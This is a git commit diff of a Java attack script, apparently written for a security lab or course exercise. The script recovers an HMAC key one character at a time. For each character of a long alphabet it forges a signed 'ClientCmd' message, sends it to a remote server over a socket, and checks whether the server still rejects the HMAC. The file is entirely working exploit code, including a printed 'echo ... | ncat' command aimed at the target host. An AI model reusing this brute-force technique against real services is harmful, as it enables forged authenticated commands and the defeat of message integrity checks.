07ae61faefcf0deff677140de20e48c064fdd3fa
gauravs08 <=sharmagauravs08@gmail.com>
2020-10-20 11:52:19 +0300

    Buffer overrun fixes

--- src/main/java/BufferOverRun_FindKey.java
+++ src/main/java/BufferOverRun_FindKey.java
@@ -1,83 +1,79 @@
 import javax.crypto.Mac;
 import javax.crypto.spec.SecretKeySpec;
 import javax.xml.bind.DatatypeConverter;
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
+import java.io.*;
 import java.net.Socket;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 
 public class BufferOverRun_FindKey {
 
+    private static final int PORT = 38770;
+    private static final int USER = 302115;
+    private static final String CLIENT_TAG = "ClientCmd";
+    private static final String ALPHABETS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[ !#$£%&'()*+,-./\\:;<=>?@^_`{|}~\"ÄäÅåÖö¤¢¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÅÆÇÈÉÊËÌÍÎÏ]";
+
     public static void main(String[] args) {
-
-        String alphabets = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[ !#$£%&'()*+,-./\\:;<=>?@^_`{|}~\"ÄäÅåÖö¤]";
-        //String digits = "0123456789";
-        //String symbols = "[ !\"#$%&'()*+,-./:;<=>?@^_`{|}~]";
         try {
-            String oneCharShortKey ="1234567891234567891";
-            //String oneCharShortKey = "12345678912345678912";
-            //String message = "ClientCmd|202233|aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa12345678912345678912";
-            for (char c : alphabets.toCharArray()) {
+            char nullChar = '\0';
+            String oneCharShortKey = "This is a dummy ke"; //Initial setup------
+            //String oneCharShortKey = "This is a dummy";
+            //String command = "aaa............................";//Initial setup------
+            String command = "aaa......................."; // Only for last char
+            for (char c : ALPHABETS.toCharArray()) {
+                //String hMackey = "This is a dummy ke"+ nullChar + c; //Initial setup------
+                //String hMackey = ""+ nullChar + c +"QXrApiLZRmVlpGnWWNu";
+                //String hMackey = "This is a dummy "+ nullChar + c +"QJ";
+                //String hMackey = ""+ nullChar + c+"YvI2QbqA4Oc3MO60qQJ";
 
-                String hMackey = "1234567891234567891"+c;
-                //System.out.println("KEY:" + oneCharShortKey);
-                String command = "aaa............................";
-                //System.out.println("command:" + command);
-                String message = "ClientCmd|202233|" + command + hMackey;
-                //System.out.println("Msg:" + message);
-                //ClientCmd|202233|aaa ...........................This is a dummy oneCharShortKey!
+                String hMackey =  c+ "QXrApiLZRmVlpGnWWNu"; //Only for last char
+
+                String message = CLIENT_TAG + "|" + USER + "|" + command; // only for last char
+                //String message = CLIENT_TAG + "|" + USER + "|" + command + oneCharShortKey;//Initial setup------
+
                 Mac hasher = Mac.getInstance("HmacSHA256");
+
                 hasher.init(new SecretKeySpec(hMackey.getBytes(), "HmacSHA256"));
 
                 byte[] hash = hasher.doFinal(message.getBytes());
-                //System.out.println("HASH:"+hash);
-                // to lowercase hexits
                 String hexBin = DatatypeConverter.printHexBinary(hash);
-                //System.out.println("hexBinary :" + hexBin.toLowerCase());
-                // to base64
 
-                //String base64Binary = DatatypeConverter.printBase64Binary(hash);
-                //System.out.println("base64Binary: " + base64Binary + "\n");
-                //System.out.print("Key :: " + oneCharShortKey + " :: ");
-                //System.out.println("echo \"202233;" + command+";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291\n");
-                //System.out.println("echo \"202233;" + command + oneCharShortKey + ";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291");
-                telnetCode(command, oneCharShortKey, hexBin.toLowerCase());
+                //telnetCode(command, oneCharShortKey, hexBin, c); //Initial setup----
+                telnetCode(command, "", hexBin, c); //Only for last key
             }
-        } catch (NoSuchAlgorithmException e) {
+        } catch (
+                NoSuchAlgorithmException e) {
             System.out.println("NoSuchAlgorithmException" + e.getMessage());
-        } catch (InvalidKeyException e) {
+        } catch (
+                InvalidKeyException e) {
             System.out.println("InvalidKeyException" + e.getMessage());
         }
+
     }
 
-
-    public static void telnetCode(String cmd, String oneCharShortKey, String hexBin) {
+    public static void telnetCode(String cmd, String oneCharShortKey, String hexBin, char c) {
         Socket pingSocket = null;
         PrintWriter out = null;
         BufferedReader in = null;
-
         try {
-            pingSocket = new Socket("device1.vikaa.fi", 35291);
+            pingSocket = new Socket("device1.vikaa.fi", PORT);
             out = new PrintWriter(pingSocket.getOutputStream(), true);
             in = new BufferedReader(new InputStreamReader(pingSocket.getInputStream()));
         } catch (IOException e) {
-            return;
+            System.out.println("IOException" + e.getMessage());
         }
-        //System.out.println("echo \"202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291");
-        out.println("202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase());
+        System.out.println("echo \"202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase() + "\" | ncat device1.vikaa.fi 35291");
+        out.println(USER + ";" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase());
 
-        //out.println("202233;aaa............................12345678912345678912;331f5fb7709a6cc09ee2474a2f068f270bbd9507fb3d4074ad77a6e96714277e");
-        //System.out.println("202233;" + cmd + oneCharShortKey + ";" + hexBin.toLowerCase());
         try {
-                String readLines = in.readLine();
+            String readLines = in.readLine();
             if (!readLines.equals("Invalid HMAC. Command not accepted.")) {
                 System.out.println(readLines);
-                System.out.println(" -----Matched:" + oneCharShortKey);
-            } else{
-                System.out.println(readLines);
+                System.out.println(" -----lastchar:" + c);
+                System.exit(0);
+            } else {
+                //System.out.println(" Testing one char with HashKey: " + c);
+                //System.out.println(readLines);
             }
             out.close();
             in.close();
@@ -86,5 +82,13 @@ public class BufferOverRun_FindKey {
             e.printStackTrace();
         }
 
+    }
+
+    private static byte[] addLastTerminationByte(String input) throws UnsupportedEncodingException {
+        //byte[] stringBytes=input.getBytes("ISO-8859-1");
+        byte[] stringBytes = input.getBytes();
+        byte[] ntBytes = new byte[input.length() + 1];
+        System.arraycopy(stringBytes, 0, ntBytes, 0, stringBytes.length);
+        return ntBytes;
     }
 }
